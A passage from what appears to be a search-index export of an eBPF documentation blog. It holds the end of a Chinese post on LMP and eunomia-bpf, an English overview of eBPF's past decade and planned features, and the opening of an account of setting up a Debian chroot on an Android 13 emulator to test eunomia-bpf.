\u7b49\u5e73\u53f0\uff0c\u4ee5\u53ca\u5d4c\u5165\u5f0f\u3001\u8fb9\u7f18\u8ba1\u7b97\u76f8\u5173\u7684\u8bbe\u5907\u8fdb\u884c\u66f4\u8fdb\u4e00\u6b65\u7684\u6d4b\u8bd5\uff1b\u4e5f\u8bb8\u5728\u672a\u6765\uff0c\u6211\u4eec\u8fd8\u53ef\u4ee5\u63d0\u4f9b Windows \u4e0a\u7684 eBPF \u7a0b\u5e8f\u652f\u6301\u548c\u7c7b\u4f3c\u7684\u5f00\u53d1\u4f53\u9a8c\uff1b</li> <li>\u63d0\u4f9b\u6807\u51c6\u5316\u3001\u7a33\u5b9a\u7684 JSON \u548c Wasm \u63a5\u53e3\u534f\u8bae\u89c4\u8303\u4ee5\u53ca OCI \u955c\u50cf\u89c4\u8303\uff0c\u4e0d\u548c\u4efb\u4f55\u7684\u4f9b\u5e94\u5546\u6216\u4e91\u670d\u52a1\u7ed1\u5b9a\u3002\u5982\u679c\u4e0d\u4f7f\u7528 eunomia-bpf \u76f8\u5173\u7684\u5e95\u5c42\u8fd0\u884c\u65f6\uff0c\u6216\u4f7f\u7528\u81ea\u5b9a\u4e49\u7684 Wasm \u8fd0\u884c\u65f6\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u6807\u51c6\u5316\u7684\u63a5\u53e3\u6765\u4f7f\u7528 LMP \u4e2d\u5df2\u7ecf\u6709\u7684\u5927\u91cf eBPF \u7a0b\u5e8f\u751f\u6001\u3002</li> <li>\u63d0\u4f9b\u66f4\u53cb\u597d\u7684\u7528\u6237\u6001\u5f00\u53d1\u63a5\u53e3\uff0c\u4ee5\u53ca\u66f4\u591a\u7684\u7528\u6237\u6001\u5f00\u53d1\u8bed\u8a00 SDK\uff0c\u4f8b\u5982 Go\u3001Rust\u3001Python \u7b49\uff1b</li> <li>\u8fdb\u884c\u66f4\u591a\u5173\u4e8e Wasm \u548c eBPF \u7ed3\u5408\u7684\u63a2\u7d22\uff1b</li> </ol>"},{"location":"blogs/lmp-eunomia/#_4","title":"\u53c2\u8003\u8d44\u6599 &amp; \u63a8\u8350\u9605\u8bfb","text":"<ul> <li>eunomia-bpf: \u4e00\u4e2a eBPF \u7a0b\u5e8f\u52a8\u6001\u52a0\u8f7d\u6846\u67b6</li> <li>LMP project: Linux \u663e\u5fae\u955c</li> <li>OCI Registry As Storage (oras.land)</li> <li>\u5f53 Wasm \u9047\u89c1 eBPF\uff1a\u4f7f\u7528 WebAssembly \u7f16\u5199\u3001\u5206\u53d1\u3001\u52a0\u8f7d\u8fd0\u884c eBPF \u7a0b\u5e8f | \u9f99\u8725\u6280\u672f (qq.com)</li> <li>\u5f00\u653e\u5bb9\u5668\u6807\u51c6(OCI) \u5185\u90e8\u5206\u4eab (xuanwo.io)</li> <li>WebAssembly | MDN (mozilla.org)</li> <li>WebAssembly \u4e2d\u6587\u7f51|Wasm \u4e2d\u6587\u6587\u6863</li> <li>eBPF \u5728\u7ebf\u5b66\u4e60\u5e73\u53f0\uff1abolipi.com/ebpf/home/online</li> </ul> <p>Share on  Share on </p>"},{"location":"blogs/ten-years/","title":"The Past, Present, and Future of eBPF and Its Path to Revolutionizing Systems","text":"<p>This blog post mainly references Alexei Starovoitov's presentation \"Modernize BPF for the Next 10 Years\" at BPFConf 2024.</p> <p>Imagine having a Swiss Army knife for your computer's core operations\u2014something that lets you peek inside how data moves, tweak processes on the fly, and monitor everything in real-time. That\u2019s exactly what eBPF (Extended Berkeley Packet Filter) offers. Over the past decade, eBPF has transformed from a simple packet filtering tool into a powerhouse for networking, observability, and security. So, what\u2019s next for eBPF? Let\u2019s dive into its journey, explore where it\u2019s headed in the next ten years, and discuss the challenges and opportunities that lie ahead. This exploration will help us understand how eBPF is shaping the future of modern systems.</p>"},{"location":"blogs/ten-years/#a-decade-in-review-ebpfs-journey-so-far","title":"A Decade in Review: eBPF's Journey So Far","text":""},{"location":"blogs/ten-years/#how-did-programmable-networking-begin-with-ebpf","title":"How Did Programmable Networking Begin with eBPF?","text":"<p>Back in 2014, the networking world was facing some serious limitations. Traditional networking stacks were rigid, making it tough to implement custom packet processing logic tailored to specific needs. Enter eBPF\u2014a game-changer that allowed developers to write small programs running directly in the kernel whenever a network packet arrived. This innovation meant more control over data handling, leading to better performance and flexibility without the hassle of cumbersome network drivers.</p> <p>With eBPF, developers could create solutions that fit their exact networking requirements, paving the way for more efficient data processing and innovative networking applications. This shift marked the beginning of programmable networking, where customization and performance could go hand in hand.</p>"},{"location":"blogs/ten-years/#what-made-xdp-a-game-changer-for-high-speed-networking","title":"What Made XDP a Game-Changer for High-Speed Networking?","text":"<p>As eBPF gained traction in networking, a significant hurdle emerged: the <code>sk_buff</code> structure in the Linux kernel introduced too much overhead, making it difficult to achieve high speeds like 10 Gbps. While user-space networking solutions could reach these speeds, eBPF running in the kernel struggled to keep up.</p> <p>The breakthrough came with eXpress Data Path (XDP). By running eBPF programs directly within the Network Interface Card (NIC) driver, XDP significantly reduced processing overhead. This allowed for much faster packet handling, enabling high-speed networking applications that were previously out of reach.</p> <p>Tools like Katran and Cilium leveraged XDP to deliver lightning-fast networking solutions, showcasing eBPF's ability to handle high-throughput data effortlessly. XDP turned eBPF into a viable option for environments demanding top-tier network performance, solidifying its role in modern networking.</p>"},{"location":"blogs/ten-years/#how-did-btf-and-co-re-make-tracing-smarter","title":"How Did BTF and CO-RE Make Tracing Smarter?","text":"<p>As eBPF expanded into tracing and observability, developers encountered a new challenge: kernel data structures varied across different kernel versions. This inconsistency meant BPF programs had to include specific kernel headers and be recompiled for each system, complicating deployment and maintenance.</p> <p>Enter BPF Type Format (BTF) and Compile Once - Run Everywhere (CO-RE). BTF adds type information to the kernel binary (vmlinux), allowing BPF programs to understand kernel data structures without needing recompilation for each version. CO-RE, facilitated by libbpf, lets BPF programs be compiled once and run on any system, dynamically adapting to different kernel versions at load time.</p> <p>These advancements made tracing tools more robust and portable, easing the maintenance burden on developers and encouraging broader adoption of eBPF-based observability solutions. Developers could now deploy tracing tools across diverse environments without worrying about kernel version mismatches, greatly enhancing productivity and reliability.</p>"},{"location":"blogs/ten-years/#how-did-skeletons-and-global-variables-simplify-ebpf-development","title":"How Did Skeletons and Global Variables Simplify eBPF Development?","text":"<p>Writing eBPF programs in C often meant dealing with global variables that were tricky to manage from user space. These variables lived in <code>.data</code> and <code>.bss</code> sections, making interactions between user-space applications and BPF programs cumbersome and error-prone.</p> <p>The introduction of skeleton generation, powered by BTF and libbpf, changed the game. Skeletons allow developers to generate type-safe code that bridges the gap between user space and BPF programs. No more wrestling with opaque global variables! Instead, developers can interact with BPF variables in a structured and safe manner, significantly simplifying the development process.</p> <p>This not only reduces bugs but also speeds up the creation of feature-rich eBPF applications. Additionally, tools like GPTtrace leverage large language models (LLMs) to further simplify the development of eBPF programs, lowering the barrier for developers without deep OS expertise. This combination of skeletons and AI-driven tools makes eBPF development more accessible and efficient than ever before.</p>"},{"location":"blogs/ten-years/#from-no-loops-to-powerful-iterators-how-did-control-flow-in-ebpf-evolve","title":"From No Loops to Powerful Iterators: How Did Control Flow in eBPF Evolve?","text":"<p>Early eBPF programs were limited in their control flow capabilities\u2014loops weren\u2019t supported to keep programs simple and verifiable. While this approach ensured safety, it also restricted what developers could achieve, limiting the complexity of eBPF applications.</p> <p>Over the years, eBPF has gradually introduced more advanced looping mechanisms:</p> <ul> <li>2014: No support for loops, maintaining simplicity and safety.</li> <li>2019: Introduction of bounded loops, allowing loops with a fixed number of iterations.</li> <li>2021: Addition of the <code>bpf_loop()</code> helper function, providing more flexibility for looping constructs.</li> <li>2023: Implementation of open-coded iterators, offering even more powerful and efficient looping mechanisms.</li> <li>2024 (Planned): Introduction of <code>cond_break</code> to allow breaking out of loops based on specific conditions.</li> </ul> <p>These enhancements enable developers to write more complex and efficient eBPF programs. With support for loops and advanced iterators, eBPF can handle sophisticated data processing tasks and perform real-time analytics directly within the kernel. This evolution in control flow capabilities has unlocked new possibilities for what eBPF can achieve, making it a more versatile tool for developers.</p>"},{"location":"blogs/ten-years/#shaping-the-future-whats-next-for-ebpf","title":"Shaping the Future: What\u2019s Next for eBPF?","text":"<p>As we look to the future, eBPF continues to evolve with cutting-edge features and enhancements that promise to revolutionize how we interact with system internals. Let\u2019s explore some of the exciting developments on the horizon and the opportunities and challenges they present.</p>"},{"location":"blogs/ten-years/#how-will-kfuncs-make-kernel-interfaces-more-flexible","title":"How Will kfuncs Make Kernel Interfaces More Flexible?","text":"<p>Traditionally, BPF helper functions had fixed user-space APIs (UAPIs) with hard-coded IDs, limiting eBPF's flexibility and extensibility. The introduction of the kfunc mechanism changes this dynamic. Kfuncs allow kernel modules to define their own helper functions for BPF, providing a more flexible and extensible interface.</p> <p>This means developers can extend eBPF's capabilities without waiting for kernel updates. Custom helper functions can be tailored to specific needs, fostering innovation and enabling new use cases that were previously out of reach. For more details, see the Tutorial on kfuncs.</p> <p>By allowing kernel modules to define their own helpers, kfuncs make the eBPF ecosystem more adaptable and responsive to emerging requirements, ensuring that eBPF remains relevant and powerful in a rapidly changing technological landscape.</p>"},{"location":"blogs/ten-years/#what-are-struct-ops-and-how-do-they-enhance-ebpf","title":"What Are Struct-Ops and How Do They Enhance eBPF?","text":"<p>Adding new eBPF attach types for kernel subsystems has been challenging due to the lack of a stable interface. The struct-ops mechanism addresses this by allowing sets of BPF programs to act as callbacks for stable kernel APIs like TCP congestion control.</p> <p>This opens the door for eBPF to integrate deeply with various kernel subsystems, such as:</p> <ul> <li>Schedulers: Creating custom eBPF task scheduling policies to optimize CPU usage.</li> <li>HID (Human Interface Devices): Developing unique eBPF input device handling mechanisms.</li> <li>FUSE (Filesystem in Userspace): Implementing flexible and efficient eBPF fuse solutions.</li> <li>Queuing Disciplines: Managing network traffic more effectively, reducing latency, and improving throughput. See the link for details.</li> </ul> <p>Struct-ops enable eBPF to enhance performance and flexibility across these subsystems, making it a versatile tool for a wide range of kernel-level customizations. By providing a stable interface, struct-ops simplify the integration process, encouraging more widespread adoption and innovative applications of eBPF in system management and optimization.</p>"},{"location":"blogs/ten-years/#how-does-bpf_arena-enhance-data-structures-in-ebpf","title":"How Does bpf_arena Enhance Data Structures in eBPF?","text":"<p>As eBPF use cases expand, there's a growing need for more complex data structures like trees and graphs. The introduction of bpf_arena addresses this by providing a shared memory space between BPF and user space. bpf_arena allows developers to implement intricate algorithms and data structures directly within eBPF programs.</p> <p>With bpf_arena, developers can handle more sophisticated data processing tasks, optimize memory usage, and improve access patterns. This enhancement paves the way for eBPF to support advanced applications that require robust data management capabilities. Detailed capabilities are outlined in the eBPF documentation.</p> <p>By facilitating the creation of complex data structures, bpf_arena significantly broadens the scope of what eBPF can achieve, enabling more advanced analytics, monitoring, and optimization tasks within the kernel.</p>"},{"location":"blogs/ten-years/#why-are-bpf-libraries-important-for-a-rich-ecosystem","title":"Why Are BPF Libraries Important for a Rich Ecosystem?","text":"<p>Sharing code across BPF programs has historically been challenging due to dependency management issues. Inspired by languages like Rust and Python, the future of eBPF lies in robust library support. By distributing libraries as source code, developers can simplify dependencies and encourage code reuse.</p> <p>This approach fosters a community-driven ecosystem where developers can build on each other's work, reducing duplication and accelerating development. A rich library ecosystem will make it easier to create feature-rich eBPF applications, driving broader adoption and innovation.</p> <p>Robust BPF libraries provide standardized tools and functions that developers can leverage, enhancing productivity and ensuring consistency across different eBPF projects. This collective effort not only speeds up development but also improves the overall quality and reliability of eBPF applications.</p>"},{"location":"blogs/ten-years/#how-will-arbitrary-locks-improve-concurrency-in-ebpf","title":"How Will Arbitrary Locks Improve Concurrency in eBPF?","text":"<p>Current locking mechanisms in eBPF, such as <code>bpf_spin_lock()</code>, are limited and prone to deadlocks. This restricts the development of more complex, concurrent BPF applications. The proposed solution is a new locking system that supports multiple locks and prevents deadlocks.</p> <p>This upgrade will allow more sophisticated concurrency patterns within BPF programs, enabling developers to build more reliable and efficient applications. With better concurrency support, eBPF can handle more demanding tasks without compromising system stability. Learn more from LWN.net and the eBPF Documentation.</p> <p>Improved concurrency mechanisms will enhance the performance and scalability of eBPF applications, making them more suitable for high-performance environments where multiple operations need to run simultaneously without interference.</p>"},{"location":"blogs/ten-years/#what-does-embracing-turing-completeness-mean-for-ebpf","title":"What Does Embracing Turing Completeness Mean for eBPF?","text":"<p>eBPF is already Turing complete, meaning it can perform any computation given enough resources. However, to fully leverage this potential, additional features like jump tables and indirect goto instructions are needed. These enhancements will enable more dynamic and flexible control flow within eBPF programs.</p> <p>With these improvements, eBPF can support even more powerful and flexible programming models within the kernel. This will push the boundaries of what eBPF can achieve, opening up new possibilities for developers. Embracing Turing completeness fully will allow eBPF to handle more complex algorithms and processes, making it an even more indispensable tool for system programming and optimization.</p>"},{"location":"blogs/ten-years/#making-ebpf-even-better-instruction-set-and-registers","title":"Making eBPF Even Better: Instruction Set and Registers","text":""},{"location":"blogs/ten-years/#how-will-evolving-the-bpf-instruction-set-isa-improve-ebpf","title":"How Will Evolving the BPF Instruction Set (ISA) Improve eBPF?","text":"<p>Certain operations in eBPF remain clunky or inefficient. Enhancing the instruction set can make a significant difference in both performance and ease of use. Proposed enhancements include:</p> <ul> <li>Indirect Calls: Introducing new opcodes to simplify and speed up function calls. See LPC talk.</li> <li>Bit Manipulation: Adding instructions for common bit operations, such as finding and counting bits, can optimize frequent tasks. See the LPC talk.</li> </ul> <p>These additions will make eBPF programs more efficient and easier to write, expanding their usability and performance. Detailed specifications can be found in the Kernel Docs.</p> <p>By refining the instruction set, eBPF becomes more powerful and versatile, allowing developers to write more optimized and feature-rich programs without unnecessary complexity.</p>"},{"location":"blogs/ten-years/#what-optimizations-can-be-made-to-ebpf-registers","title":"What Optimizations Can Be Made to eBPF Registers?","text":"<p>Different architectures offer varying numbers of registers, and eBPF can sometimes be inefficient in how it uses them. Potential improvements include:</p> <ul> <li>Virtual Registers: Abstracting away hardware limitations to maximize efficiency.</li> <li>Register Spilling/Filling: Optimizing how registers are used and managed to prevent bottlenecks.</li> <li>More Hardware Registers: Allowing compilers to take advantage of additional registers when available.</li> </ul> <p>Better register management means faster and more efficient eBPF programs, enhancing overall performance and making eBPF a more powerful tool for developers. Optimizing register usage is crucial for ensuring that eBPF can handle increasingly complex tasks without running into resource limitations.</p>"},{"location":"blogs/ten-years/#how-can-ebpf-handle-more-function-arguments","title":"How Can eBPF Handle More Function Arguments?","text":"<p>Currently, eBPF functions are limited to passing five arguments due to register constraints. To overcome this limitation, two solutions are proposed:</p> <ul> <li>Additional Registers: Utilizing more registers where possible to pass extra arguments.</li> <li>Stack Space: Passing extra arguments via the stack, carefully managing performance and safety.</li> </ul> <p>These solutions will provide more flexibility in function calls, allowing for more complex and capable eBPF programs. For more information, see the instruction set and Stack Overflow.</p> <p>Enhancing the ability to handle more function arguments will enable developers to write more comprehensive and feature-rich eBPF programs, expanding the scope of applications that can be efficiently managed within the kernel.</p>"},{"location":"blogs/ten-years/#ambitious-goals-compiling-the-kernel-to-bpf-isa","title":"Ambitious Goals: Compiling the Kernel to BPF ISA","text":"<p>Imagine if significant parts of the Linux kernel could be compiled to the BPF instruction set. This vision would revolutionize kernel development and analysis, offering several exciting benefits:</p> <ul> <li>Enhanced Analysis: Monitoring and verifying kernel behavior becomes easier with BPF\u2019s flexible programmability.</li> <li>Flexibility: Quickly adapting and updating kernel components without needing a full recompilation.</li> </ul> <p>This ambitious goal envisions a more dynamic and adaptable kernel, driven by the power and flexibility of eBPF. It could lead to more efficient kernel development cycles and a more resilient operating system overall. Discussions on this can be found in LWN.net and the IETF Draft on BPF ISA.</p> <p>Compiling the kernel to BPF ISA would allow developers to write and deploy kernel modules with the same ease and flexibility that eBPF already provides, streamlining development and enhancing system reliability.</p>"},{"location":"blogs/ten-years/#memory-management-upgrades-dynamic-stacks-and-more","title":"Memory Management Upgrades: Dynamic Stacks and More","text":""},{"location":"blogs/ten-years/#how-can-we-break-free-from-the-512-byte-stack-limit","title":"How Can We Break Free from the 512-Byte Stack Limit?","text":"<p>eBPF programs currently face a strict 512-byte stack limit, which restricts their complexity and the types of computations they can perform. To overcome this limitation, introducing <code>alloca()</code> will allow dynamic memory allocation within eBPF programs.</p> <p>With <code>alloca()</code>, the stack can grow as needed, enabling more complex functions and data structures. This enhancement will allow developers to create more sophisticated and feature-rich eBPF programs, expanding the range of possible applications. Details are available in the bpf_arena_alloc_pages.</p> <p>Breaking free from the stack limit will empower developers to implement more intricate logic and handle larger datasets within eBPF programs, enhancing their capabilities and applications.</p>"},{"location":"blogs/ten-years/#safer-programs-cancellable-ebpf-scripts","title":"Safer Programs: Cancellable eBPF Scripts","text":""},{"location":"blogs/ten-years/#how-can-we-ensure-ebpf-programs-remain-safe-and-efficient","title":"How Can We Ensure eBPF Programs Remain Safe and Efficient?","text":"<p>Long-running eBPF programs can consume significant CPU resources, potentially leading to system instability. To address this, new mechanisms for safely canceling these programs are proposed.</p> <p>Implementing timeouts will automatically terminate programs that run too long, while watchdogs can monitor and manage program execution. Additionally, providing safe cancellation points ensures that programs can be stopped without causing system issues.</p> <p>These safeguards will make eBPF programs more reliable and stable, even when handling complex tasks, ensuring that the system remains responsive and secure. By introducing these safety mechanisms, eBPF can be used more confidently in critical environments where system stability is paramount.</p>"},{"location":"blogs/ten-years/#expanding-observability-to-user-space","title":"Expanding Observability to User Space","text":""},{"location":"blogs/ten-years/#how-is-ebpf-making-user-space-monitoring-easier","title":"How Is eBPF Making User-Space Monitoring Easier?","text":"<p>Observing what's happening in user-space applications is inherently more complex than monitoring the kernel. Diverse programming languages and runtime environments add to the challenge. However, eBPF is evolving to bridge this gap.</p> <p>Innovations like Fast Uprobes offer efficient user-space probes with minimal performance impact. User-Space Statically Defined Tracing (USDT) allows applications to define their own tracing points, providing more granular monitoring. Additionally, language-specific stack walkers for languages like C++, Python, and Java can interpret their specific stack frames, offering meaningful trace information.</p> <p>These advancements enable more comprehensive and detailed monitoring of user-space applications, providing better insights and debugging capabilities for developers and system administrators. By extending observability into user space, eBPF ensures that every aspect of system performance can be meticulously tracked and optimized.</p>"},{"location":"blogs/ten-years/#rethinking-limits-the-1-million-instruction-cap","title":"Rethinking Limits: The 1 Million Instruction Cap","text":""},{"location":"blogs/ten-years/#should-we-relax-the-1-million-instruction-limit-in-ebpf","title":"Should We Relax the 1 Million Instruction Limit in eBPF?","text":"<p>Currently, eBPF programs are limited to 1 million instructions to ensure they remain verifiable and terminate correctly. While this safeguard maintains system stability, it also limits the complexity of what eBPF programs can achieve.</p> <p>There's an ongoing debate about relaxing this limit for programs that can demonstrate forward verification progress. Balancing the need for more complex programs with system safety and performance is crucial. If successfully implemented, this change could allow more sophisticated eBPF applications, expanding their usefulness without compromising security or stability. For more insights, refer to LWN.net.</p> <p>Relaxing the instruction limit could unlock new possibilities for eBPF, allowing it to handle more extensive and intricate tasks while still maintaining the necessary safeguards to protect system integrity.</p>"},{"location":"blogs/ten-years/#modularizing-ebpf-independent-kernel-modules","title":"Modularizing eBPF: Independent Kernel Modules","text":""},{"location":"blogs/ten-years/#what-are-the-benefits-of-making-ebpf-a-separate-kernel-module","title":"What Are the Benefits of Making eBPF a Separate Kernel Module?","text":"<p>There has been significant discussion about making eBPF an independent kernel module. Imagine being able to update the eBPF subsystem without needing to update the entire kernel. This vision is becoming a reality by making BPF a separate kernel module.</p> <p>This modular approach offers several advantages:</p> <ul> <li>Faster Updates: New features and fixes can be rolled out more quickly without waiting for full kernel releases.</li> <li>Reduced Dependency: Developers and users don\u2019t have to wait for kernel updates to leverage the latest eBPF capabilities.</li> <li>Increased Flexibility: Experimentation and innovation can proceed without being tied to kernel release cycles.</li> </ul> <p>This shift will lead to a more agile and responsive eBPF ecosystem, keeping pace with rapid technological advancements and developer needs. By decoupling eBPF from the kernel, updates and improvements can be deployed more efficiently, enhancing the overall user experience and system performance.</p>"},{"location":"blogs/ten-years/#expanding-ebpf-to-other-platforms","title":"Expanding eBPF to Other Platforms","text":"<p>Beyond Linux, eBPF's capabilities are extending to other platforms, broadening its impact and utility across different environments.</p> <p>Furthermore, eBPF for Windows extends eBPF's capabilities beyond Linux, enabling developers to utilize eBPF's powerful features on Windows systems. This cross-platform support opens up new avenues for developers who work in heterogeneous environments, allowing them to apply eBPF's benefits regardless of the operating system.</p> <p>Additionally, Userspace eBPF runtime such as bpftime overcomes kernel-space limitations, unlocking even more potential for eBPF applications. By enabling user-space execution of eBPF application such as bcc-tools or bpftrace, bpftime allows for greater flexibility and experimentation, making eBPF accessible to a wider range of use cases and developers.</p> <p>Expanding eBPF to other platforms ensures that its powerful features are available to a broader audience, promoting innovation and enhancing system performance across diverse operating systems.</p>"},{"location":"blogs/ten-years/#whats-next-for-ebpf","title":"What's Next for eBPF?","text":"<p>eBPF has already tackled major challenges in tracing, observability, and programmable networking. But the journey doesn\u2019t stop here. The future holds even more exciting possibilities:</p>"},{"location":"blogs/ten-years/#how-will-bpf-lsm-expand-ebpf-into-security","title":"How Will bpf-lsm Expand eBPF into Security?","text":"<p>bpf-lsm (BPF Linux Security Modules) allows eBPF to enforce custom security policies. This means developers can tailor security measures to specific needs, leveraging eBPF\u2019s power to monitor and control system behavior in real-time. With bpf-lsm, eBPF can play a crucial role in enhancing system security, offering more granular and dynamic protection mechanisms.</p> <p>By integrating security directly into the kernel via eBPF, bpf-lsm provides a flexible and powerful way to implement and manage security policies, making systems more resilient against threats and vulnerabilities.</p>"},{"location":"blogs/ten-years/#can-ebpf-optimize-scheduling-for-better-performance","title":"Can eBPF Optimize Scheduling for Better Performance?","text":"<p>Applying eBPF to task and packet scheduling can lead to better performance and resource management. For task scheduling, eBPF can create custom scheduling policies that optimize CPU usage based on specific workloads. For packet scheduling, eBPF can manage network traffic more effectively, reducing latency and improving throughput. These optimizations will result in more efficient and responsive systems capable of handling diverse workloads with ease. Check out the sched-ext/scx repository for more details.</p> <p>Optimizing scheduling with eBPF ensures that system resources are utilized more effectively, enhancing overall performance and user experience, especially in environments with varying and demanding workloads.</p>"},{"location":"blogs/ten-years/#ebpfs-guiding-principles","title":"eBPF's Guiding Principles","text":"<p>At the heart of eBPF\u2019s evolution are three core principles:</p> <ol> <li>To Innovate: Continuously pushing the boundaries of what's possible in both kernel and user-space programming.</li> <li>To Enable Others to Innovate: Providing tools and frameworks that empower developers to build new and exciting solutions.</li> <li>To Challenge What is Possible: Breaking through existing limitations and redefining what operating systems can do.</li> </ol> <p>These principles ensure that eBPF remains a cutting-edge tool, driving forward the future of computing by fostering creativity and overcoming challenges. By adhering to these guiding tenets, eBPF continues to evolve and adapt, maintaining its position at the forefront of system development and optimization.</p>"},{"location":"blogs/ten-years/#conclusion","title":"Conclusion","text":"<p>Looking back, it's clear that eBPF has come a long way\u2014from its humble beginnings in programmable networking to becoming a powerhouse for tracing, observability, and beyond. The future is even brighter, with exciting features on the horizon that promise to make eBPF even more powerful, flexible, and user-friendly.</p> <p>These developments, along with tools like LLMs such as GPTtrace, eBPF for Windows, and bpftime, are making eBPF more accessible and versatile across different environments, further cementing its role as a critical tool in modern system development. Additionally, we are leveraging large language models to better understand eBPF code in the kernel through projects like code-survey, enhancing our ability to analyze and optimize eBPF programs.</p> <p>As we move into the next decade, eBPF stands ready to tackle new challenges and unlock new possibilities. Whether you're a developer looking to optimize your applications, a system administrator striving for better performance, or just a tech enthusiast eager to explore the latest innovations, eBPF has something to offer.</p> <p>For more details and interesting topics, please visit BPFConf 2024.</p>"},{"location":"blogs/ten-years/#references","title":"References","text":"<ol> <li>Wikipedia - An overview of eBPF\u2019s journey and its capabilities to run programs securely in the kernel.</li> <li>Isovalent Blog - Chronicles the story behind eBPF\u2019s creation and its impact on the tech industry.</li> <li>IO Visor - XDP allows for efficient packet processing directly in the kernel, offering significant performance enhancements.</li> <li>XDP - A framework for fast packet processing that illustrates the advantages of integrating XDP with eBPF applications.</li> <li>BPF Type Format - BTF provides essential type information that enhances the verifiability and portability of BPF applications.</li> <li>libbpf Documentation - Skeleton files ease the interaction between user space and BPF programs, optimizing the management of global variables.</li> <li>GitHub Discussion - Discusses how global variables can be accessed and managed within eBPF applications.</li> <li>Speaker Deck - Analyzes the functioning and verification of control flows within eBPF.</li> <li>Kernel Docs - Provides insights on kernel functions that enhance the flexibility and extensibility of BPF applications.</li> <li>Kfunc Tutorial - Describes how custom kfuncs enable more powerful interactions between kernel functions and eBPF programs.</li> <li>eBPF Docs - Explains how struct-ops improve performance and allow for more elaborate interfaces between BPF programs and kernel subsystems.</li> <li>LWN.net - Discusses bpf_arena as a memory region that supports custom data structures shared between BPF programs and user space.</li> <li>eBPF Docs - Details the capabilities of bpf_arena in managing complex data structures.</li> <li>Red Hat Developers - Discusses the role of libbpf in streamlining interactions and enhancing program development.</li> <li>LWN.net - Explains the significance of arbitrary locks in managing concurrency in eBPF, enhancing process integrity.</li> <li>eBPF Documentation - Offers a comprehensive overview of concurrency management techniques within eBPF programs.</li> <li>Isovalent - Confirms that eBPF is Turing complete, capable of solving any computable problem with potential applications spanning various domains.</li> <li>Kernel Docs - Outlines the specifications and historical context of BPF ISA, along with recent enhancements for better performance.</li> <li>Stack Overflow - Offers insights into how parameters can be accessed and managed within eBPF functions.</li> <li>Standardizing the BPF ISA - LWN.net - Discusses the broader implications of compiling kernel modules to use BPF ISA and the benefits it brings.</li> <li>IETF Draft on BPF ISA - Examines the details surrounding BPF ISA and its roadmap for future enhancements.</li> <li>bpf_arena_alloc_pages - Details the introduction of <code>alloca()</code> for dynamic memory allocation within eBPF programs.</li> <li>sched-ext/scx - Repository for task and packet scheduling optimizations using eBPF.</li> </ol> <p>Share on  Share on </p>"},{"location":"blogs/test-for-Android/","title":"Running the ecli on Android 13","text":"<p>Author: CH3CHOHCH3</p>"},{"location":"blogs/test-for-Android/#abstract","title":"Abstract","text":"<p>This article mainly records the author's exploration process, results, and encountered issues when testing the support level of the high version Android Kernel for CO-RE technology based on libbpf in the Android Studio Emulator. The testing method used is to build a Debian environment in the Android Shell environment and attempt to build the eunomia-bpf toolchain and run its test cases based on this environment.</p>"},{"location":"blogs/test-for-Android/#background","title":"Background","text":"<p>As of now (2023-04), Android has not provided good support for dynamic loading of eBPF programs. Whether it is the compiler distribution scheme represented by bcc or the CO-RE scheme based on btf and libbpf, they are largely dependent on the support of the Linux environment and cannot run well on the Android system <sup>2</sup>.</p> <p>However, there have been some successful cases of trying eBPF on the Android platform. In addition to the scheme provided by Google, which modifies <code>Android.bp</code> to build and mount eBPF programs with the entire system <sup>1</sup>, some people have proposed the idea of \u200b\u200bbuilding a Linux environment based on the Android kernel to run eBPF toolchains and have developed related tools.</p> <p>Currently existing materials mostly rely on adeb/eadb to build Linux sandboxes based on the Android kernel and test bcc and bpftrace toolchains, but there is less testing work on the CO-RE scheme. There are more reference materials for using the bcc tool on Android, such as:</p> <ul> <li>SeeFlowerX: https://blog.seeflower.dev/category/eBPF/</li> <li>evilpan: https://bbs.kanxue.com/thread-271043.htm</li> </ul> <p>The main idea is to use chroot to run a Debian image on the Android kernel and build the entire bcc toolchain in it, thus using eBPF tools. The principle is similar if you want to use bpftrace.</p> <p>In fact, the high version of the Android kernel already supports the btf option, which means that the emerging CO-RE technology in the eBPF field should also be able to be applied to Linux systems based on the Android kernel. This article will test and run eunomia-bpf in the emulator environment based on this.</p> <p>eunomia-bpf is an open-source project that combines libbpf and WebAssembly technologies, aiming to simplify the writing, compiling, and deployment of eBPF programs. This project can be regarded as a practical way of CO-RE, which relies on libbpf at its core. It is believed that the testing work of eunomia-bpf can provide reference for other CO-RE schemes.</p>"},{"location":"blogs/test-for-Android/#testing-environment","title":"Testing Environment","text":"<ul> <li>Android Emulator (Android Studio Flamingo | 2022.2.1)</li> <li>AVD: Pixel 6</li> <li>Android Image: Tiramisu Android 13.0 x86_64 (5.15.41-android13-8-00055-g4f5025129fe8-ab8949913)</li> </ul>"},{"location":"blogs/test-for-Android/#environment-setup","title":"Environment Setup <sup>3</sup>","text":"<ol> <li>Obtain <code>debianfs-amd64-full.tar.gz</code> from the releases page of the eadb repository as the rootfs of the Linux environment, and also get the <code>assets</code> directory of the project to build the environment.</li> <li>Configure and start the Android Virtual Device in Android Studio's Device Manager.</li> <li>Use the adb tool of the Android Studio SDK to push <code>debianfs-amd64-full.tar.gz</code> and the <code>assets</code> directory to the AVD:</li> <li><code>./adb push debianfs-amd64-full.tar.gz /data/local/tmp/deb.tar.gz</code></li> <li><code>./adb push assets /data/local/tmp/assets</code></li> <li>Use adb to enter the Android shell environment and obtain root permissions:</li> <li><code>./adb shell</code></li> <li><code>su</code></li> <li>Build and enter the Debian environment in the Android shell:</li> <li><code>mkdir -p /data/eadb</code></li> <li><code>mv /data/local/tmp/assets/* /data/eadb</code></li> <li><code>mv /data/local/tmp/deb.tar.gz /data/eadb/deb.tar.gz</code>+ <code>rm -r /data/local/tmp/assets</code></li> <li><code>chmod +x /data/eadb/device-*</code></li> <li><code>/data/eadb/device-unpack</code></li> <li><code>/data/eadb/run /data/eadb/debian</code></li> </ol> <p>The Linux environment required for testing eBPF has been built. In addition, in the Android shell (before entering debian), you can use <code>zcat /proc/config.gz</code> with <code>grep</code> to view the kernel compilation options.</p> <p>Currently, the debian environment packaged by eadb has a low libc version and lacks many tool dependencies. Additionally, due to different kernel compilation options, some eBPF functionalities may not be available. </p>"},{"location":"blogs/test-for-Android/#tool-building","title":"Tool Building","text":"<p>Clone the eunomia-bpf repository to the local debian environment. For specific building process, please refer to the build.md in the repository. In this test, I used the <code>ecc</code> compiler to generate <code>package.json</code>, and the build and usage methods of this tool can be found on the repository page.</p> <p>During the building process, you may need to manually install tools such as <code>curl</code>, <code>pkg-config</code>, <code>libssl-dev</code>, etc. 